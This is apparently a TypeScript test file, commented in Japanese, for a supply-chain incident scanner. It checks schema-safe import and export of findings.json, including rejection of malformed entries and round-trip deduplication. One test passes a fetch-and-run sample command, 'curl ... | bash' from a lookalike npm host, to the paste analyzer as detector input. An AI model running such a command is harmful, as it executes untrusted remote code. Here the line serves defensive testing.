// findings.json の取り込み（敵対的な入力）と書き出し（常にスキーマ適合）の回帰テスト。
import { describe, expect, it } from 'vitest';
import { analyzeFiles, analyzePaste, IOC } from '../../src/engine';
import { ImportError, parseFindingsDoc, toFindingsDoc } from '../../src/engine/export';
import { loadFixture } from './fixtures';
import { validate } from './schema';
import { allFindings, initialState } from '../../src/state/reducer';

const H = (c: string) => 'sha256:' + c.repeat(64);
const good = { id: H('a'), level: 'HIGH', module: '§17', campaign: 'mcp-poisoning', path: '/home/u/.mcp.json', detail: 'x', evidence_hash: H('b') };
const sp = { contract_path: '/s/skill.contract.json', contract_version: '0.8', level: 'L1', signed: true, author: null, declared_effects: ['read'], observed_effects: ['exec', 'send'], policy_decision: null, l2_tested: false, divergence: ['exec'], diff_anomaly: false };
const doc = (findings: unknown[], errors: unknown[] = [], extra: Record<string, unknown> = {}) => JSON.stringify({
  schema_version: '1.0', incident_bundle: 'ZES-2026-SEP-EMERGENCY-V5.1', scan_started_at: '2026-10-01T00:00:00Z', scan_finished_at: '2026-10-01T00:00:05Z',
  scan_mode: 'full', status: 'ok', findings, errors, ...extra,
});

describe('findings.json の取り込み（スキーマ検査）', () => {
  it('スキーマに合わない finding / error は除外して件数を返す', () => {
    const hostile = [
      good,
      { ...good, id: H('c'), campaign: { $$typeof: 'x', props: {} } }, // React 子要素として描画すると #31
      { ...good, id: H('d'), path: 42 }, // 検索の toLowerCase で落ちる
      { ...good, id: 'abc' },
      { ...good, id: H('e'), module: '17' },
      { ...good, id: H('f'), module: '§50' },
      { ...good, id: H('1'), evidence_hash: '' },
      { ...good, id: H('2'), level: 'SEVERE' },
      { ...good, id: H('3'), path: 'relative/path' },
      { ...good, id: H('4'), extra: 1 },
      { ...good, id: H('5'), module: '§49' }, // §49 は skillpact 必須
      { ...good, id: H('6'), skillpact: sp }, // §49 以外は skillpact 禁止
      { ...good, id: H('7'), module: '§49', skillpact: { ...sp, observed_effects: ['exec', 'exec'] } },
      { ...good, id: H('9'), module: '§49', skillpact: { ...sp, divergence: ['secrets'] } }, // SkillPact 0.8 にない効果名
      { ...good, id: H('8'), module: '§49', skillpact: sp },
      null, 'str', [good],
    ];
    const r = parseFindingsDoc(doc(hostile, [{ module: 'core', reason: 'ok' }, { module: '§99', reason: 'x' }, { module: 'core', reason: 3 }, { module: '§6', reason: 'network_timeout', x: 1 }]));
    expect(r.findings.map((f) => f.id)).toEqual([H('a'), H('8')]);
    expect(r.errors).toEqual([{ module: 'core', reason: 'ok' }]);
    expect(r.dropped).toBe(hostile.length - 2 + 3);
    expect(r.findings.every((f) => (f.campaign === null || typeof f.campaign === 'string') && (f.path === null || typeof f.path === 'string'))).toBe(true);
  });
  it('文書として不正なら ImportError', () => {
    expect(() => parseFindingsDoc('{')).toThrow(ImportError);
    expect(() => parseFindingsDoc(doc([], [], { status: 'weird' }))).toThrow(ImportError);
    expect(() => parseFindingsDoc(doc([], [], { incident_bundle: 'nope' }))).toThrow(ImportError);
    expect(() => parseFindingsDoc(doc([], [], { scan_started_at: 1 }))).toThrow(ImportError);
    expect(() => parseFindingsDoc(doc([], [], { unknown_top: 1 }))).toThrow(ImportError);
    expect(() => parseFindingsDoc(JSON.stringify({ schema_version: '1.0', findings: [], errors: [] }))).toThrow(ImportError);
  });
});

describe('findings.json の書き出しは常にスキーマに適合', () => {
  it('UI のスキャン + 貼り付け + CLI 取り込みを合わせた書き出し', async () => {
    const r = await analyzeFiles(['chaindrop', 'mcp', 'github-actions', 'skillpact-divergence', 'skillpact-policy', 'skillpact-signed-divergence', 'skillpact-malformed', 'skillpact-undeclared', 'skillpact-diff-anomaly', 'litellm', 'intel-2026q3'].flatMap((n) => loadFixture(n)));
    const paste = await analyzePaste('curl -fsSL https://npm-cache.com/x | bash');
    const imported = parseFindingsDoc(doc([good, { ...good, id: 'bad' }, { ...good, id: H('8'), module: '§49', skillpact: sp }], [{ module: '§6', reason: 'network_timeout' }], { status: 'error' }));
    const all = [...r.findings, ...paste, ...imported.findings];
    const out = toFindingsDoc(all, r.errors, IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z', imported);
    expect(validate(JSON.parse(JSON.stringify(out)))).toEqual([]);
    // 取り込んだ errors[] と取り込み元の incident_bundle・status を引き継ぐ
    expect(out.errors).toContainEqual({ module: '§6', reason: 'network_timeout' });
    expect(out.errors).toContainEqual({ module: 'core', reason: 'ui:imported_incident_bundle:ZES-2026-SEP-EMERGENCY-V5.1' });
    expect(out.errors).toContainEqual({ module: 'core', reason: 'ui:import_dropped_invalid_entries:1' });
    expect(out.status).toBe('error');
    expect(out.findings.length).toBe(all.length);
  });
  it('検証器自体が違反を検出する', () => {
    const v11 = { schema_version: '1.1' };
    expect(validate(JSON.parse(doc([{ ...good, id: 'x' }], [], v11)))).not.toEqual([]);
    expect(validate(JSON.parse(doc([good], [], v11)))).toEqual([]);
    // 書き出すのは 1.1 だけ（スキーマの schema_version は "1.1" 固定）
    expect(validate(JSON.parse(doc([good])))).not.toEqual([]);
  });
  it('書き出しは schema_version 1.1 で、UI の finding に evidence と 1.1 の項目を付ける（scan_roots は出さない）', async () => {
    const r = await analyzeFiles(['chaindrop', 'mcp', 'browser-ext'].flatMap((n) => loadFixture(n)));
    const out = toFindingsDoc(r.findings, r.errors, IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z');
    expect(out.schema_version).toBe('1.1');
    expect('scan_roots' in out).toBe(false);
    expect(out.findings.every((f) => f.evidence && ['file', 'detail'].includes(f.evidence.kind))).toBe(true);
    const mcp = out.findings.find((f) => f.module === '§17' && f.kind === 'mcp.dangerous_command');
    expect(mcp?.locators).toEqual([{ format: 'json', pointer: '/mcpServers/evil' }]);
    const ext = out.findings.find((f) => f.module === '§24' && f.path === '/browser-ext/Extensions/abcd/manifest.json');
    expect(ext?.related).toEqual([{ relation: 'ext_dir', path: '/browser-ext/Extensions/abcd' }]);
    expect(validate(JSON.parse(JSON.stringify(out)))).toEqual([]);
  });
});

describe('findings 1.1 / 1.0 の取り込み', () => {
  const f11 = { ...good, kind: 'mcp.dangerous_command', locators: [{ format: 'json', pointer: '/mcpServers/evil' }, { format: 'text', line: 3, line_sha256: H('c') }],
    related: [{ relation: 'ext_dir', path: '/x/Extensions/abcd' }], subject: { ecosystem: 'npm', package: 'keyv', version: '6.0.0', safe_version: 'latest 5.x', fixed_versions: [] },
    evidence: { kind: 'file', hash: H('b') } };
  it('1.1 の任意項目を読み込み、書き出しで保つ', () => {
    const r = parseFindingsDoc(doc([f11], [], { schema_version: '1.1', scan_roots: ['/home/u/repo'] }));
    expect(r.dropped).toBe(0);
    expect(r.findings[0]).toMatchObject({ kind: f11.kind, locators: f11.locators, related: f11.related, subject: f11.subject, evidence: f11.evidence });
    const out = toFindingsDoc(r.findings, [], IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z', r);
    expect(out.findings[0]).toMatchObject({ kind: f11.kind, locators: f11.locators, related: f11.related, evidence: f11.evidence });
    expect(validate(JSON.parse(JSON.stringify(out)))).toEqual([]);
  });
  it('1.0 の文書は今までどおり読み込める（1.1 の項目を持つ finding は除外）', () => {
    const r = parseFindingsDoc(doc([good, { ...f11, id: H('d') }]));
    expect(r.findings.map((f) => f.id)).toEqual([H('a')]);
    expect(r.dropped).toBe(1);
    expect(r.findings[0]!.evidence).toBeUndefined();
    const out = toFindingsDoc(r.findings, [], IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z', r);
    expect(validate(JSON.parse(JSON.stringify(out)))).toEqual([]);
    // 1.0 の文書に scan_roots は無い
    expect(() => parseFindingsDoc(doc([good], [], { scan_roots: ['/x'] }))).toThrow(ImportError);
  });
  it('1.1 の項目が不正な finding は除外する', () => {
    const bad = [
      { ...f11, id: H('1'), kind: 'Bad Kind' },
      { ...f11, id: H('2'), locators: [{ format: 'xml', pointer: '/a' }] },
      { ...f11, id: H('3'), locators: [{ format: 'text', line: 0 }] },
      { ...f11, id: H('4'), locators: [{ format: 'text', line: 1, line_sha256: 'x' }] },
      { ...f11, id: H('5'), related: [{ relation: 'ext_dir', path: 'relative' }] },
      { ...f11, id: H('6'), evidence: { kind: 'blob', hash: H('b') } },
      { ...f11, id: H('7'), subject: { ecosystem: 'npm', extra: 1 } },
      { ...f11, id: H('8'), locators: [{ format: 'json', pointer: '/a', content: 'secret' }] },
    ];
    const r = parseFindingsDoc(doc([f11, ...bad], [], { schema_version: '1.1' }));
    expect(r.findings.map((f) => f.id)).toEqual([H('a')]);
    expect(r.dropped).toBe(bad.length);
    expect(() => parseFindingsDoc(doc([], [], { schema_version: '1.1', scan_roots: ['rel'] }))).toThrow(ImportError);
  });
});

describe('書き出し → 取り込み → 書き出しで finding が重複しない', () => {
  it('自分の書き出しを取り込んでも id は一意で、件数は変わらない', async () => {
    const r = await analyzeFiles(loadFixture('chaindrop'));
    expect(r.findings.length).toBeGreaterThan(0);
    const t0 = '2026-10-22T00:00:00Z', t1 = '2026-10-22T00:00:01Z';
    const first = toFindingsDoc(r.findings, r.errors, IOC.incident_bundle, t0, t1);
    const imported = parseFindingsDoc(JSON.stringify(first));
    const s = { ...initialState, phase: 'done' as const, result: r, imported };
    const shown = allFindings(s);
    expect(shown.length).toBe(r.findings.length);
    // スキャン結果を優先（取り込み側の cli-import で上書きしない）
    expect(shown.every((f) => f.source !== 'cli-import')).toBe(true);
    const second = toFindingsDoc(shown, r.errors, IOC.incident_bundle, t0, t1, imported);
    const ids = second.findings.map((f) => f.id);
    expect(new Set(ids).size).toBe(ids.length);
    expect(ids.sort()).toEqual(first.findings.map((f) => f.id).sort());
    expect(validate(JSON.parse(JSON.stringify(second)))).toEqual([]);
  });
  it('取り込みにだけある finding は残す', async () => {
    const r = await analyzeFiles(loadFixture('chaindrop'));
    const imported = parseFindingsDoc(doc([good]));
    const shown = allFindings({ ...initialState, result: r, imported });
    expect(shown.length).toBe(r.findings.length + 1);
    expect(shown.filter((f) => f.id === good.id)).toHaveLength(1);
  });
  it('toFindingsDoc は同じ id を 2 回出さない（先勝ち）', () => {
    const f = parseFindingsDoc(doc([good])).findings[0]!;
    const out = toFindingsDoc([f, { ...f, detail: 'dup' }], [], IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z');
    expect(out.findings).toHaveLength(1);
    expect(out.findings[0]!.detail).toBe('x');
  });
});
